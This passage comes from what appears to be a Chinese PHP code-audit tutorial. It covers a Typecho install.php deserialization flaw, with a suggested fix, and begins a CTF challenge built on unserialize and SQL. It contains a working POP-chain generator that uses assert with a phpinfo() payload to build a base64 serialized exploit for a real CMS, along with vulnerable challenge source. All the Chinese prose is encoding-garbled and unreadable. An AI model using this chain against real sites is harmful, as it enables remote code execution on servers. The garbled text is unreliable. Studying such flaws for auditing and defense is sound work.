</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;_params[<span class="string">&#x27;screenName&#x27;</span>] = <span class="string">&#x27;phpinfo()&#x27;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;_filter[<span class="number">0</span>] = <span class="string">&#x27;assert&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ¥ä¸‹æ¥æˆ‘ä»¬å»çœ‹ä¸€ä¸‹ <strong>Typecho_Feed</strong> ç±»çš„æ„é€ ï¼Œè¯¥ç±»åœ¨ <strong>var&#x2F;Typecho&#x2F;Feed.php</strong> æ–‡ä»¶ä¸­ï¼Œä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$result</span> = <span class="string">&#x27;&lt;?xml version=&quot;1.0&quot; encoding=&quot;&#x27;</span> . <span class="variable language_">$this</span>-&gt;_charset . <span class="string">&#x27;&quot;?&gt;&#x27;</span> . <span class="built_in">self</span>::<span class="variable constant_">EOL</span>;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">self</span>::<span class="variable constant_">RSS1</span> == <span class="variable language_">$this</span>-&gt;_type) &#123;</span><br><span class="line">        ......</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="built_in">self</span>::<span class="variable constant_">RSS2</span> == <span class="variable language_">$this</span>-&gt;_type) &#123;</span><br><span class="line">        <span class="variable">$result</span> .= <span class="string">&#x27;&lt;rss version=&quot;2.0&quot;</span></span><br><span class="line"><span class="string">            xmlns:content=&quot;http://purl.org/rss/1.0/modules/content/&quot;</span></span><br><span class="line"><span class="string">            xmlns:dc=&quot;http://purl.org/dc/elements/1.1/&quot;</span></span><br><span class="line"><span class="string">            xmlns:slash=&quot;http://purl.org/rss/1.0/modules/slash/&quot;</span></span><br><span class="line"><span class="string">            xmlns:atom=&quot;http://www.w3.org/2005/Atom&quot;</span></span><br><span class="line"><span class="string">            xmlns:wfw=&quot;http://wellformedweb.org/CommentAPI/&quot;&gt;</span></span><br><span class="line"><span class="string">            &lt;channel&gt;&#x27;</span> . <span class="built_in">self</span>::<span class="variable constant_">EOL</span>;</span><br><span class="line">        <span class="variable">$content</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">        <span class="variable">$lastUpdate</span> = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable language_">$this</span>-&gt;_items <span class="keyword">as</span> <span class="variable">$item</span>) &#123;</span><br><span class="line">            <span class="variable">$content</span> .= <span class="string">&#x27;&lt;item&gt;&#x27;</span> . <span class="built_in">self</span>::<span class="variable constant_">EOL</span>;</span><br><span class="line">            <span class="variable">$content</span> .= <span class="string">&#x27;&lt;title&gt;&#x27;</span> . <span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$item</span>[<span class="string">&#x27;title&#x27;</span>]) . <span class="string">&#x27;&lt;/title&gt;&#x27;</span> . <span class="built_in">self</span>::<span class="variable constant_">EOL</span>;</span><br><span class="line">            <span class="variable">$content</span> .= <span class="string">&#x27;&lt;link&gt;&#x27;</span> . <span class="variable">$item</span>[<span class="string">&#x27;link&#x27;</span>] . <span class="string">&#x27;&lt;/link&gt;&#x27;</span> . <span class="built_in">self</span>::<span class="variable constant_">EOL</span>;</span><br><span class="line">            <span class="variable">$content</span> .= <span class="string">&#x27;&lt;guid&gt;&#x27;</span> . <span class="variable">$item</span>[<span class="string">&#x27;link&#x27;</span>] . <span class="string">&#x27;&lt;/guid&gt;&#x27;</span> . <span class="built_in">self</span>::<span class="variable constant_">EOL</span>;</span><br><span class="line">            <span class="variable">$content</span> .= <span class="string">&#x27;&lt;pubDate&gt;&#x27;</span> . <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">dateFormat</span>(<span class="variable">$item</span>[<span class="string">&#x27;date&#x27;</span>]) . <span class="string">&#x27;&lt;/pubDate&gt;&#x27;</span> . <span class="built_in">self</span>::<span class="variable constant_">EOL</span>;</span><br><span class="line">            <span class="variable">$content</span> .= <span class="string">&#x27;&lt;dc:creator&gt;&#x27;</span> . <span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$item</span>[<span class="string">&#x27;author&#x27;</span>]-&gt;screenName) . <span class="string">&#x27;&lt;/dc:creator&gt;&#x27;</span> . <span class="built_in">self</span>::<span class="variable constant_">EOL</span>;</span><br><span class="line">            <span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="variable">$item</span>[<span class="string">&#x27;category&#x27;</span>]) &amp;&amp; <span class="title function_ invoke__">is_array</span>(<span class="variable">$item</span>[<span class="string">&#x27;category&#x27;</span>])) &#123;</span><br><span class="line">                <span class="keyword">foreach</span> (<span class="variable">$item</span>[<span class="string">&#x27;category&#x27;</span>] <span class="keyword">as</span> <span class="variable">$category</span>) &#123;</span><br><span class="line">                    <span class="variable">$content</span> .= <span class="string">&#x27;&lt;category&gt;&lt;![CDATA[&#x27;</span> . <span class="variable">$category</span>[<span class="string">&#x27;name&#x27;</span>] . <span class="string">&#x27;]]&gt;&lt;/category&gt;&#x27;</span> . <span class="built_in">self</span>::<span class="variable constant_">EOL</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        ......</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä¸Šå›¾ä»£ç  <strong>ç¬¬7è¡Œ</strong> ï¼Œæ»¡è¶³ <strong>self::RSS2</strong> ä¸ <strong>$this-&gt;_type</strong> ç›¸ç­‰è¿›å…¥è¯¥åˆ†æ”¯ï¼Œæ‰€ä»¥ <strong>$this-&gt;_type</strong> éœ€è¦æ„é€ ï¼Œ<strong>item[â€˜authorâ€™]</strong> ä¸ºè§¦å‘ç‚¹ï¼Œéœ€è¦æ„é€  <strong>$this_items</strong> ï¼Œå…·ä½“æ„é€ å¦‚ä¸‹ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Typecho_Request</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$_params</span> = <span class="keyword">array</span>();</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$_filter</span> = <span class="keyword">array</span>();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;_params[<span class="string">&#x27;screenName&#x27;</span>] = <span class="string">&#x27;phpinfo()&#x27;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;_filter[<span class="number">0</span>] = <span class="string">&#x27;assert&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Typecho_Feed</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$_type</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$_items</span> = <span class="keyword">array</span>();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;_type = <span class="string">&#x27;RSS 2.0&#x27;</span>;</span><br><span class="line">        <span class="variable">$item</span>[<span class="string">&#x27;author&#x27;</span>] = <span class="keyword">new</span> <span class="title class_">Typecho_Request</span>();</span><br><span class="line">        <span class="variable">$item</span>[<span class="string">&#x27;category&#x27;</span>] = <span class="title function_ invoke__">Array</span>(<span class="keyword">new</span> <span class="title class_">Typecho_Request</span>());</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;_items[<span class="number">0</span>] = <span class="variable">$item</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$x</span> = <span class="keyword">new</span> <span class="title class_">Typecho_Feed</span>();</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">array</span>(</span><br><span class="line">    <span class="string">&#x27;adapter&#x27;</span> =&gt; <span class="variable">$x</span>,</span><br><span class="line">    <span class="string">&#x27;prefix&#x27;</span> =&gt; <span class="string">&#x27;typecho_&#x27;</span></span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br></pre></td></tr></table></figure><p>ä»£ç  <strong>22è¡Œ</strong> åœ¨å®é™…åˆ©ç”¨æ²¡å¿…è¦æ·»åŠ ï¼Œinstall.phpåœ¨ä»£ç  <strong>54è¡Œ</strong> è°ƒç”¨ <strong>ob_start()</strong> å‡½æ•°ï¼Œè¯¥å‡½æ•°å¯¹è¾“å‡ºå†…å®¹è¿›è¡Œç¼“å†²,ååºåˆ—åŒ–æ¼æ´åˆ©ç”¨ç»“æŸåï¼Œåœ¨<strong>var\Typecho\Db.php</strong>ä»£ç 121è¡Œï¼Œè§¦å‘å¼‚å¸¸ï¼Œåœ¨ <strong>var\Typecho\Common.php</strong> ä»£ç 237è¡Œè°ƒç”¨ <strong>ob_end_clean()å‡½æ•°</strong> æ¸…é™¤äº†ç¼“å†²åŒºå†…å®¹ï¼Œå¯¼è‡´æ— æ³•çœ‹è§æ‰§è¡Œç»“æœï¼Œè€ƒè™‘åœ¨è¿›å…¥åˆ°å¼‚å¸¸å¤„ç†å‰æå‰æŠ¥é”™ç»“æŸç¨‹åºã€‚ç”±æ­¤æ„é€ è¯¥æ•°æ®ã€‚æ‰§è¡Œç»“æœå¦‚ä¸‹ï¼š </p><p><img src="/2024/10/14/WebSecurity/codeaudit/phpaudit3/image-20.png"></p><h3 id="ä¿®å¤å»ºè®®"><a href="#ä¿®å¤å»ºè®®" class="headerlink" title="ä¿®å¤å»ºè®®"></a>ä¿®å¤å»ºè®®</h3><p>é€ æˆè¯¥æ¼æ´çš„åŸå› ä¸»è¦æœ‰ä¸¤ç‚¹ï¼š</p><ul><li>å½“ <strong>config.inc.php</strong> æ–‡ä»¶å­˜åœ¨çš„æ—¶ï¼Œå¯ç»•è¿‡åˆ¤æ–­ç»§ç»­å¾€ä¸‹æ‰§è¡Œä»£ç ã€‚</li><li>ä¼ å…¥ååºåˆ—åŒ–å‡½æ•°çš„å‚æ•°å¯æ§</li></ul><p>ä¿®å¤æ–¹æ³•ï¼šåœ¨ <strong>install.php</strong> æ–‡ä»¶ç¬¬ä¸€è¡Œåˆ¤æ–­ <strong>config.inc.php</strong> æ˜¯å¦å­˜åœ¨ï¼Œå¦‚æœå­˜åœ¨ï¼Œåˆ™é€€å‡ºä»£ç æ‰§è¡Œã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(<span class="title function_ invoke__">dirname</span>(<span class="keyword">__FILE__</span>) . <span class="string">&#x27;/config.inc.php&#x27;</span>))</span><br><span class="line">    <span class="keyword">exit</span>(<span class="string">&#x27;Access Denied&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="é¢˜ç›®-2"><a href="#é¢˜ç›®-2" class="headerlink" title="é¢˜ç›®"></a>é¢˜ç›®</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;config.php&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">HITCON</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$method</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$args</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$conn</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$method</span>, <span class="variable">$args</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;method = <span class="variable">$method</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;args = <span class="variable">$args</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">__conn</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__conn</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$db_host</span>, <span class="variable">$db_name</span>, <span class="variable">$db_user</span>, <span class="variable">$db_pass</span>, <span class="variable">$DEBUG</span>;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="variable language_">$this</span>-&gt;conn)</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;conn = <span class="title function_ invoke__">mysql_connect</span>(<span class="variable">$db_host</span>, <span class="variable">$db_user</span>, <span class="variable">$db_pass</span>);</span><br><span class="line">        <span class="title function_ invoke__">mysql_select_db</span>(<span class="variable">$db_name</span>, <span class="variable">$this</span>-&gt;conn);</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$DEBUG</span>) &#123;</span><br><span class="line">            <span class="variable">$sql</span> = <span class="string">&quot;DROP TABLE IF  EXISTS  users&quot;</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">__query</span>(<span class="variable">$sql</span>, <span class="variable">$back</span>=<span class="literal">false</span>);</span><br><span class="line">            <span class="variable">$sql</span> = <span class="string">&quot;CREATE TABLE IF NOT EXISTS users (username VARCHAR(64),</span></span><br><span class="line"><span class="string">            password VARCHAR(64),role VARCHAR(256)) CHARACTER SET utf8&quot;</span>;</span><br><span class="line"></span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">__query</span>(<span class="variable">$sql</span>, <span class="variable">$back</span>=<span class="literal">false</span>);</span><br><span class="line">            <span class="variable">$sql</span> = <span class="string">&quot;INSERT INTO users VALUES (&#x27;orange&#x27;, &#x27;<span class="subst">$db_pass</span>&#x27;, &#x27;admin&#x27;), (&#x27;phddaa&#x27;, &#x27;ddaa&#x27;, &#x27;user&#x27;)&quot;</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">__query</span>(<span class="variable">$sql</span>, <span class="variable">$back</span>=<span class="literal">false</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="title function_ invoke__">mysql_query</span>(<span class="string">&quot;SET names utf8&quot;</span>);</span><br><span class="line">        <span class="title function_ invoke__">mysql_query</span>(<span class="string">&quot;SET sql_mode = &#x27;strict_all_tables&#x27;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__query</span>(<span class="params"><span class="variable">$sql</span>, <span class="variable">$back</span>=<span class="literal">true</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$result</span> = @<span class="title function_ invoke__">mysql_query</span>(<span class="variable">$sql</span>);</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$back</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> @<span class="title function_ invoke__">mysql_fetch_object</span>(<span class="variable">$result</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">login</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">list</span>(<span class="variable">$username</span>, <span class="variable">$password</span>) = <span class="title function_ invoke__">func_get_args</span>();</span><br><span class="line">        <span class="variable">$sql</span> = <span class="title function_ invoke__">sprintf</span>(<span class="string">&quot;SELECT * FROM users WHERE username=&#x27;%s&#x27; AND password=&#x27;%s&#x27;&quot;</span>, <span class="variable">$username</span>, <span class="title function_ invoke__">md5</span>(<span class="variable">$password</span>));</span><br><span class="line">        <span class="variable">$obj</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">__query</span>(<span class="variable">$sql</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> ( <span class="variable">$obj</span> != <span class="literal">false</span> ) &#123;</span><br><span class="line">            <span class="title function_ invoke__">define</span>(<span class="string">&#x27;IN_FLAG&#x27;</span>, <span class="literal">TRUE</span>);</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">loadData</span>(<span class="variable">$obj</span>-&gt;role);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">          <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">__die</span>(<span class="string">&quot;sorry!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">loadData</span>(<span class="params"><span class="variable">$data</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">substr</span>(<span class="variable">$data</span>, <span class="number">0</span>, <span class="number">2</span>) !== <span class="string">&#x27;O:&#x27;</span> &amp;&amp; !<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/O:\d:/&#x27;</span>, <span class="variable">$data</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="title function_ invoke__">unserialize</span>(<span class="variable">$data</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> [];</span><br><span class="line">    &#125;</span><br><span class="line">  </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__die</span>(<span class="params"><span class="variable">$msg</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">__close</span>();</span><br><span class="line">        <span class="title function_ invoke__">header</span>(<span class="string">&quot;Content-Type: application/json&quot;</span>);</span><br><span class="line">        <span class="keyword">die</span>( <span class="title function_ invoke__">json_encode</span>( <span class="keyword">array</span>(<span class="string">&quot;msg&quot;</span>=&gt; <span class="variable">$msg</span>) ) );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__close</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">mysql_close</span>(<span class="variable">$this</span>-&gt;conn);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">source</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">__conn</span>();</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">in_array</span>(<span class="variable">$this</span>-&gt;method, <span class="keyword">array</span>(<span class="string">&quot;login&quot;</span>, <span class="string">&quot;source&quot;</span>))) &#123;</span><br><span class="line">            @<span class="title function_ invoke__">call_user_func_array</span>(<span class="keyword">array</span>(<span class="variable">$this</span>, <span class="variable">$this</span>-&gt;method), <span class="variable language_">$this</span>-&gt;args);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">__die</span>(<span class="string">&quot;What do you do?&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">__close</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">foreach</span>(<span class="variable language_">$this</span>-&gt;args <span class="keyword">as</span> <span class="variable">$k</span> =&gt; <span class="variable">$v</span>) &#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;args[<span class="variable">$k</span>] = <span class="title function_ invoke__">strtolower</span>(<span class="title function_ invoke__">trim</span>(<span class="title function_ invoke__">mysql_escape_string</span>(<span class="variable">$v</span>)));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SoFun</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file</span>=<span class="string">&#x27;index.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable language_">$this</span>-&gt;file)) &#123;</span><br><span class="line">            <span class="keyword">include</span> <span class="variable language_">$this</span>-&gt;file;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="variable language_">$this</span>-&gt; file=<span class="string">&#x27;index.php&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&quot;data&quot;</span>])) &#123;</span><br><span class="line">    @<span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&quot;data&quot;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">new</span> <span class="title function_ invoke__">HITCON</span>(<span class="string">&quot;source&quot;</span>, <span class="keyword">array</span>());</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//config.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$db_host</span> = <span class="string">&#x27;localhost&#x27;</span>;</span><br><span class="line">    <span class="variable">$db_name</span> = <span class="string">&#x27;test&#x27;</span>;</span><br><span class="line">    <span class="variable">$db_user</span> = <span class="string">&#x27;root&#x27;</span>;</span><br><span class="line">    <span class="variable">$db_pass</span> = <span class="string">&#x27;123&#x27;</span>;</span><br><span class="line"><span class="variable">$DEBUG</span> = <span class="string">&#x27;xx&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// flag.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">!<span class="title function_ invoke__">defined</span>(<span class="string">&#x27;IN_FLAG&#x27;</span>) &amp;&amp; <span class="keyword">exit</span>(<span class="string">&#x27;Access Denied&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;flag&#123;un3eri@liz3_i3_s0_fun&#125;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>è®¿é—®flag.php,æ˜¾ç¤ºç¦æ­¢è®¿é—®ï¼Œé¢˜ç›®é»˜è®¤æ˜¾ç¤ºæºç ï¼Œåœ¨ä¸‹å›¾ä»£ç 57è¡Œï¼Œæ•°æ®åº“æŸ¥è¯¢å†…å®¹ä¸ä¸ºç©ºçš„æƒ…å†µä¸‹ï¼Œå®šä¹‰å¸¸é‡IN_FLAGï¼ŒçŒœæµ‹éœ€è¦æ»¡è¶³è¯¥æ¡ä»¶æ‰èƒ½è®¿é—®flag.phpã€‚ç„¶åè°ƒç”¨loadDataå‡½æ•°ã€‚loadDataå‡½æ•°ï¼Œå¯¹ä¼ å…¥å‚æ•°è¿›è¡Œåˆ¤æ–­ï¼Œå¦‚æœéªŒè¯é€šè¿‡ï¼Œåˆ™ä½œä¸ºå‚æ•°ä¼ å…¥åˆ°ååºåˆ—åŒ–å‡½æ•°ï¼ŒéªŒè¯ä¸é€šè¿‡è¿”å›ä¸ºç©ºï¼Œè¯¥åˆ¤æ–­ç»•è¿‡å¯å‚è€ƒDay11,ä¼ å…¥å†…å®¹æ¥æºäºæ•°æ®åº“æŸ¥è¯¢ç»“æœï¼Œæ­¤æ—¶å¯è€ƒè™‘å¦‚ä½•æ„é€ æ•°æ®åº“æŸ¥è¯¢ç»“æœã€‚</p><p>åœ¨index.phpé¡µé¢æ˜¾ç¤ºæºç 